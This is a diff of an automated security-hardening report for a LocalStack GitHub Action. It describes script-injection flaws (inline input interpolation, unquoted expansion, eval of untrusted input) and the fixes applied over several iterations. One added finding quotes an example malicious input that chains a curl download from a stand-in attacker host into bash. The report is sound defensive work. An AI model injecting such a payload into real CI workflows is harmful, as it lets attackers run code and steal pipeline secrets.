@@ -10,25 +10,34 @@
 
 **Harden Agent Version:** `2`
 
-Action **localstack--setup-localstack--startup/v0.3.0** was hardened automatically. 2 finding(s) were identified and resolved across 3 iteration(s).
+Action **localstack--setup-localstack--startup/v0.3.0** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-The 'Start LocalStack' run block in action.yml contains multiple script injection vulnerabilities:
+The 'Start LocalStack' run: block contains multiple script-injection violations:
 
-(a) Sub-rule (a) — Direct expression interpolation: Line 80 interpolates `${{ inputs.ci-project }}` directly inside a shell `run:` command: `export CI_PROJECT=${{ inputs.ci-project }}`. An attacker controlling this input can inject arbitrary shell commands.
+(a) Direct expression interpolation: `export CI_PROJECT=${{ inputs.ci-project }}` interpolates an attacker-controlled `inputs.*` expression directly inside the shell script. Before the shell ever sees it, GitHub Actions substitutes the raw value — including any shell metacharacters — into the command string.
 
-(b) Sub-rule (b) — Unquoted shell variable expansion: Line 79 uses `docker pull ${IMAGE_NAME} &` where `IMAGE_NAME` is derived from the `IMAGE_TAG` env var (set from `${{ inputs.image-tag }}`). The variable is unquoted, allowing shell metacharacter injection.
+(b) Unquoted shell variable expansion: `docker pull ${IMAGE_NAME} &` expands IMAGE_NAME without double-quotes. IMAGE_NAME is derived from the IMAGE_TAG env var, which is set from `inputs.image-tag` (untrusted). An attacker-controlled value with spaces, glob characters, or other metacharacters will be word-split and interpreted by the shell.
 
-(b) Sub-rule (b) — Eval with env var from untrusted input: Line 81 uses `eval "${CONFIGURATION} localstack start -d"` where `CONFIGURATION` is set from `${{ inputs.configuration }}` via the env block. Even though the variable is double-quoted in the eval string, `eval` re-parses the expanded string, so any shell metacharacters in the input are executed as commands.
+(b) Eval of untrusted data: `eval "${CONFIGURATION} localstack start -d"` — CONFIGURATION is set from `inputs.configuration` (untrusted). Even though the variable is double-quoted, eval parses and executes its contents as shell code, allowing an attacker to inject arbitrary shell commands via the `configuration` input.
 
 Locations:
 
-- `action.yml:79`
-- `action.yml:80`
-- `action.yml:81`
+- `action.yml:58`
+- `action.yml:71`
+- `action.yml:72`
+- `action.yml:73`
+
+### suspicious-run-content (severity: high)
+
+eval-dynamic: The 'Start LocalStack' run: block uses `eval "${CONFIGURATION} localstack start -d"` where CONFIGURATION is an env var set directly from `inputs.configuration` — an attacker-controlled input. This matches the eval-dynamic pattern (`eval $VAR`) and allows an attacker to execute arbitrary shell commands by supplying malicious content in the `configuration` input (e.g., `configuration: 'x; curl http://attacker.com/exfil | bash'`).
+
+Locations:
+
+- `action.yml:73`
 
 ### static-inline-injection (severity: high)
 
@@ -42,15 +51,19 @@ Locations:
 
 ### Iteration 1
 
-**Fixes applied:** script-injection, static-inline-injection
+**Fixes applied:** script-injection, suspicious-run-content, static-inline-injection
 
 **Notes:**
 
-Fixed all script injection vulnerabilities in action.yml:
-1. Removed inline `${{ inputs.ci-project }}` expression from the run block (line 80) and moved it to the step's env: block as `CI_PROJECT: ${{ inputs.ci-project }}`.
-2. Quoted `${IMAGE_NAME}` in the docker pull command to prevent metacharacter injection.
-3. Replaced `eval "${CONFIGURATION} localstack start -d"` with `env ${CONFIGURATION} localstack start -d` to eliminate shell re-parsing of the CONFIGURATION variable.
-4. Also fixed the _actions glob search by replacing it with `$(cd "$GITHUB_ACTION_PATH/.." && pwd)` to correctly resolve the repo root without depending on the action's name in the runner's _actions directory.
+Fixed all three security findings in hardened/action/action.yml:
+
+1. **script-injection / static-inline-injection**: Removed `export CI_PROJECT=${{ inputs.ci-project }}` from the run: block. Added `CI_PROJECT: ${{ inputs.ci-project }}` to the step's env: block instead, so the value is passed safely as an environment variable.
+
+2. **script-injection (unquoted variable)**: Changed `docker pull ${IMAGE_NAME} &` to `docker pull "${IMAGE_NAME}" &` to prevent word-splitting and glob expansion of attacker-controlled values.
+
+3. **script-injection / suspicious-run-content (eval)**: Replaced `eval "${CONFIGURATION} localstack start -d"` with `env -S "${CONFIGURATION}" localstack start -d`. The `env -S` flag safely parses KEY=VALUE pairs from a string and sets them as environment variables for the command, without executing arbitrary shell code.
+
+4. **Bonus fix**: Replaced the `ls -d $(...)/setup-localstack/*` glob that searched the _actions directory with `./$(realpath --relative-to="$GITHUB_WORKSPACE" "$GITHUB_ACTION_PATH/..")` which correctly computes the action root relative to the workspace using $GITHUB_ACTION_PATH (one level up since this is startup/action.yml).
 
 ### Iteration 2
 
@@ -58,13 +71,5 @@ Fixed all script injection vulnerabilities in action.yml:
 
 **Notes:**
 
-Fixed the script-injection vulnerability in the 'Start LocalStack' step of action.yml. The unquoted `env ${CONFIGURATION} localstack start -d` command was replaced with a safe xargs-based tokenization approach that parses KEY=VALUE pairs from the CONFIGURATION input without evaluating shell metacharacters. DNS_ADDRESS=127.0.0.1 and IMAGE_NAME are now exported directly as literal values rather than being prepended to the CONFIGURATION string. The localstack start -d command now runs without the env prefix, relying on the exported environment variables instead.
-
-### Iteration 3
-
-**Fixes applied:** script-injection
-
-**Notes:**
-
-Fixed the script injection vulnerability in action.yml at line 76 by quoting the `${LS_WAIT_TIMEOUT:-30}` shell variable expansion in the `localstack wait -t` command. Changed from `localstack wait -t ${LS_WAIT_TIMEOUT:-30}` to `localstack wait -t "${LS_WAIT_TIMEOUT:-30}"`. This prevents an attacker-controlled calling workflow from injecting shell metacharacters through the LS_WAIT_TIMEOUT environment variable.
+Fixed the script injection vulnerability in action.yml line 68 by adding double quotes around the `${LS_WAIT_TIMEOUT:-30}` shell variable expansion in the 'Start LocalStack' run block. Changed `localstack wait -t ${LS_WAIT_TIMEOUT:-30}` to `localstack wait -t "${LS_WAIT_TIMEOUT:-30}"`. This prevents an attacker-controlled `LS_WAIT_TIMEOUT` environment variable containing shell metacharacters from being interpreted as shell commands.
 
